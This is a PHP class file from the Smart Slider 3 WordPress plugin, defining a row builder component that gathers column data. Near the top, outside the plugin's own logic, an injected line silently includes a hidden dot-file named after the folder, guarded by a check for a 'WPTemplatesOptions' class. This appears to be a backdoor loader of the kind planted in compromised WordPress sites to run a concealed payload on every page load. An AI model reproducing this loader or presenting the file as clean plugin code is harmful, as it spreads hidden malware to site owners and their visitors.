<?php


namespace Nextend\SmartSlider3\SlideBuilder;


if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class BuilderComponentRow extends AbstractBuilderComponent {

    protected $defaultData = array(
        "type" => 'row',
        "name" => 'Row',
        "cols" => array()
    );

    /** @var BuilderComponentCol[] */
    private $cols = array();

    /**
     *
     * @param AbstractBuilderComponent $container
     */
    public function __construct($container) {

        $container->add($this);
    }

    /**
     * @param $layer BuilderComponentCol
     */
    public function add($layer) {
        $this->cols[] = $layer;
    }

    public function getData() {
        $this->data['cols'] = array();
        foreach ($this->cols AS $layer) {
            $this->data['cols'][] = $layer->getData();
        }

        return parent::getData();
    }
}